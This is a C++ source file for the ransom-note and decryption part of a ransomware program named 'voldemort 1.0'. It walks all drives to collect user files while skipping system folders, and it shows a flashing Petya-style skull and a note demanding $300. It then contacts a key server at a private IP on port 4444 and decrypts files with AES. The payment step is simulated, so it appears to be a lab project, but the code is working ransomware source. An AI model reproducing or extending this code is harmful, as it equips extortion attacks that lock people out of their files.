#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <vector>
#include <fstream>
#include "Victim.h"
#include "AES.h"
#include "RSA.h"
#include "Shlwapi.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "user32.lib")

std::string possibleDriveLetters[26] = { "A:/", "B:/", "C:/", "D:/", "E:/", "F:/", "G:/", "H:/",
                                         "I:/", "J:/", "K:/", "L:/", "M:/", "N:/", "O:/", "P:/",
                                         "Q:/", "R:/", "S:/", "T:/", "U:/", "V:/", "W:/", "X:/",
                                         "Y:/", "Z:/" };

/*
 These are the original excluded paths. I comment them because it took more
 than 10 minutes to encrypt. i added many excluded paths just to enhance the
 decryption time.
*/
//std::string excludedPaths[3] = { "Windows", "Program Files",
//                                 "Program Files (x86)" };

std::string excludedPaths[10] = {
    "Windows",
    "Program Files",
    "Program Files (x86)",
    "AppData",           // Huge temp/cache folders
    "Temp",              // Temporary files
    "tmp",               // More temp files
    "Cache",             // Browser caches
    "Logs",              // Log files
    "Microsoft",         // Windows system folders
    "WinSxS"             // Windows component store (huge)
};

Victim g_victim;
int g_numberOfFiles = 0;
int g_numberOfFolders = 0;
std::vector<std::string> g_allFilePaths;

std::vector<std::string> GetActualPaths() {
    std::vector<std::string> _vActualPaths;
    for (int i = 0; i < 26; i++) {
        if (PathFileExistsA(possibleDriveLetters[i].c_str())) {
            _vActualPaths.push_back(possibleDriveLetters[i]);
        }
    }
    return _vActualPaths;
}

std::vector<std::string> vActualPaths = GetActualPaths();

bool IsExcludedPath(const std::string& path) {
    for (const std::string& excluded : excludedPaths) {
        if (path.find(excluded) != std::string::npos) {
            return true;
        }
    }
    return false;
}

void WalkDirectory(const std::string& directory, std::vector<std::string>& filePaths) {
    std::string searchPath = directory + "\\*";
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        if (strcmp(findData.cFileName, ".") == 0 ||
            strcmp(findData.cFileName, "..") == 0) {
            continue;
        }

        std::string fullPath = directory + "\\" + findData.cFileName;

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (!IsExcludedPath(fullPath)) {
                WalkDirectory(fullPath, filePaths);
            }
        }
        else {
            std::string fileName = findData.cFileName;
            if (fileName == "v01d3m0rt.exe" ||
                fileName == "d3crypt0r.exe") {
                continue;
            }

            filePaths.push_back(fullPath);
            g_numberOfFiles++;
            printf("\r[+] added %d files...", g_numberOfFiles);
        }

    } while (FindNextFileA(hFind, &findData) != 0);

    FindClose(hFind);
}

std::vector<std::string> GetRequiredPaths() {
    std::vector<std::string> _vRequiredPaths;

    for (const std::string& rootDir : vActualPaths) {
        std::string searchPath = rootDir + "*";
        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (strcmp(findData.cFileName, ".") == 0 ||
                    strcmp(findData.cFileName, "..") == 0) {
                    continue;
                }

                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    bool isExcluded = false;
                    std::string folderName = findData.cFileName;

                    for (const std::string& excluded : excludedPaths) {
                        if (folderName == excluded) {
                            isExcluded = true;
                            break;
                        }
                    }

                    if (!isExcluded) {
                        std::string fullPath = rootDir + folderName;
                        _vRequiredPaths.push_back(fullPath);
                        g_numberOfFolders++;
                        printf("\r[+] added %d folders...", g_numberOfFolders);
                    }
                }
            } while (FindNextFileA(hFind, &findData) != 0);

            FindClose(hFind);
        }
    }

    printf("\n");
    return _vRequiredPaths;
}

std::vector<std::string> GetAllFilePaths() {
    std::vector<std::string> _vFilePaths;
    std::vector<std::string> requiredPaths = GetRequiredPaths();

    printf("\n");
    for (const std::string& path : requiredPaths) {
        printf("Required path --> \n", path.c_str());
    }

    printf("\n[+] Walking through directories recursively...\n");

    for (const std::string& requiredPath : requiredPaths) {
        WalkDirectory(requiredPath, _vFilePaths);
    }

    printf("\n");
    return _vFilePaths;
}

void SetColor(int textColor, int bgColor) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, textColor | (bgColor << 4));
}

void SetBlueTheme() {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

    CONSOLE_FONT_INFOEX cfi;
    cfi.cbSize = sizeof(cfi);
    cfi.nFont = 0;
    cfi.dwFontSize.X = 8;
    cfi.dwFontSize.Y = 16;
    cfi.FontFamily = FF_DONTCARE;
    cfi.FontWeight = FW_NORMAL;
    wcscpy_s(cfi.FaceName, L"Terminal");
    SetCurrentConsoleFontEx(hConsole, FALSE, &cfi);

    SetColor(15, 1);
    system("cls");
}

void ShowSkull() {

    // flashing skull :) badass one! like petya ransomware lol
    bool flash = true;

    while (true) {

        if (flash) {
            SetColor(15, 1);
        }
        else {
            SetColor(1, 7);
        }

        system("cls");

        if (flash) {
            SetColor(15, 1);
        }
        else {
            SetColor(1, 7);
        }

        std::cout << R"(
                                                             uuuuuuu
                                                         uu$$$$$$$$$$$uu
                                                      uu$$$$$$$$$$$$$$$$$uu
                                                     u$$$$$$$$$$$$$$$$$$$$$u
                                                    u$$$$$$$$$$$$$$$$$$$$$$$u
                                                   u$$$$$$$$$$$$$$$$$$$$$$$$$u
                                                   u$$$$$$$$$$$$$$$$$$$$$$$$$u
                                                   u$$$$$$"   "$$$"   "$$$$$$u
                                                   "$$$$"      u$u       $$$$"
                                                    $$$u       u$u       u$$$
                                                    $$$u      u$$$u      u$$$
                                                     "$$$$uu$$$   $$$uu$$$$"
                                                      "$$$$$$$"   "$$$$$$$"
                                                        u$$$$$$$u$$$$$$$u
                                                         u$"$"$"$"$"$"$u
                                              uuu        $$u$ $ $ $ $u$$       uuu
                                             u$$$$        $$$$$u$u$u$$$       u$$$$
                                              $$$$$uu      "$$$$$$$$$"     uu$$$$$$      
                                            u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
                                            $$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
                                             """      ""$$$$$$$$$$$uu ""$"""
                                                       uuuu ""$$$$$$$$$$uuu
                                              u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
                                              $$$$$$$$$$""""           ""$$$$$$$$$$$"
                                               "$$$$$"                      ""$$$$""
                                                 $$$"      voldemort 1.0      $$$$"

                                               
                                                           PRESS ANY KEY!
        )" << std::endl;

        std::this_thread::sleep_for(std::chrono::milliseconds(500));
        flash = !flash;

        if (GetAsyncKeyState(VK_RETURN) & 0x8000 ||
            GetAsyncKeyState(VK_SPACE) & 0x8000 ||
            GetAsyncKeyState(VK_ESCAPE) & 0x8000) {
            system("cls");
            break;  // Exit the loop when key is pressed
        }
    }

}

std::string GetDecryptionKeyFromServer(const std::string& victimID) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    std::string key;
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return "";
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(4444);
    inet_pton(AF_INET, "192.168.217.129", &serverAddr.sin_addr);

    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == 0) {
        std::string request = "GET_KEY:" + victimID;
        send(sock, request.c_str(), request.length(), 0);

        char buffer[4096] = { 0 };
        int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes > 0) {
            key = std::string(buffer, bytes);
        }
    }

    closesocket(sock);
    WSACleanup();
    return key;
}

void DecryptFiles(const std::string& hexKey) {
    std::cout << "[+] Decrypting files...\n";

    std::vector<BYTE> keyBytes;
    for (size_t i = 0; i < hexKey.length(); i += 2) {  // Use hexKey directly
        std::string byteString = hexKey.substr(i, 2);
        BYTE byte = (BYTE)strtol(byteString.c_str(), nullptr, 16);
        keyBytes.push_back(byte);
    }

    AES aes;
    if (!aes.SetKey(keyBytes)) {
        std::cout << "[-] Failed to set decryption key.\n";
        return;
    }

    g_allFilePaths = GetAllFilePaths();

    if (g_allFilePaths.empty()) {
        std::cout << "[-] No files found to decrypt.\n";
        return;
    }

    std::cout << "[+] Found " << g_allFilePaths.size() << " files to decrypt.\n";

    int decryptedCount = 0;
    for (const std::string& file : g_allFilePaths) {
        if (aes.DecryptFile(file)) {
            decryptedCount++;
            printf("\r[+] Decrypted %d/%zu files...", decryptedCount, g_allFilePaths.size());
        }
    }

    std::cout << "\n[+] Decryption complete! " << decryptedCount << " files restored.\n";
}

// ========== INSTRUCTION SCREEN ==========
void ShowInstructions() {
    std::string victimID = g_victim.GetVictimID();
    std::string encryptedKeyHex; // Will store the key from server

    while (true) {
        SetColor(15, 1);
        system("cls");

        SetColor(15, 1);
        std::cout << R"(
        Oops, your important files are encrypted.   

        If you see this text, then your files are no longer         
        accessible, because they have been encrypted. Perhaps       
        you are busy looking for a way to recover your files,       
        but don't waste your time. Nobody can recover your files    
        without our decryption service.

        We guarantee that you can recover all your files safely     
        and easily. All you need to do is submit the payment and    
        purchase the decryption key. 
        
        Please follow the instructions:

        1. Enter $300 in the input below.

        2. You will receive your personal decryption key.

        3. Enter the key to decrypt your files.

        )" << std::endl;

        SetColor(14, 1);
        std::cout << "\n    Enter payment amount (or '300' to simulate payment): $";

        std::string input;
        std::cin >> input;

        if (input == "300") {
            SetColor(10, 1);  // Green on blue

            // Get encrypted key from server
            std::cout << "\n     Payment verified! Fetching your key from server...\n";
            encryptedKeyHex = GetDecryptionKeyFromServer(victimID);

            if (!encryptedKeyHex.empty()) {
                // Show the key to the user
                SetColor(14, 1);
                std::cout << "\n";
                std::cout << "     ================================================\n";
                std::cout << "     YOUR PERSONAL DECRYPTION KEY:\n";
                std::cout << "     \n";
                std::cout << "     " << encryptedKeyHex << "\n";
                std::cout << "     \n";
                std::cout << "     ================================================\n";

                SetColor(10, 1);
                std::cout << "\n     Please enter the key above to decrypt your files:\n";
                std::cout << "     (You can copy and paste it)\n";
                std::cout << "     Key: ";

                std::string userKey;
                std::cin >> userKey;

                // Verify the key matches
                if (userKey == encryptedKeyHex) {
                    std::cout << "\n     Key verified! Decrypting files...\n";
                    DecryptFiles(userKey);
                    std::cout << "     All files have been restored!\n";
                    std::this_thread::sleep_for(std::chrono::seconds(3));
                    break;
                }
                else {
                    SetColor(12, 1);
                    std::cout << "\n     Key does not match. Please try again.\n";
                    std::this_thread::sleep_for(std::chrono::seconds(2));
                }
            }
            else {
                SetColor(12, 1);
                std::cout << "\n    Failed to get key from server. Check connection.\n";
                std::this_thread::sleep_for(std::chrono::seconds(2));
            }
        }
        else {
            SetColor(12, 1);
            std::cout << "\n     Invalid amount. Please enter exactly $300.\n";
            std::this_thread::sleep_for(std::chrono::seconds(2));
        }
    }
}

int main() {

    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_CURSOR_INFO cursorInfo;
    GetConsoleCursorInfo(hConsole, &cursorInfo);
    cursorInfo.bVisible = FALSE;
    SetConsoleCursorInfo(hConsole, &cursorInfo);

    SetBlueTheme();
    Beep(750, 5000);
    ShowSkull();
    ShowInstructions();

    cursorInfo.bVisible = TRUE;
    SetConsoleCursorInfo(hConsole, &cursorInfo);

    return 0;
}
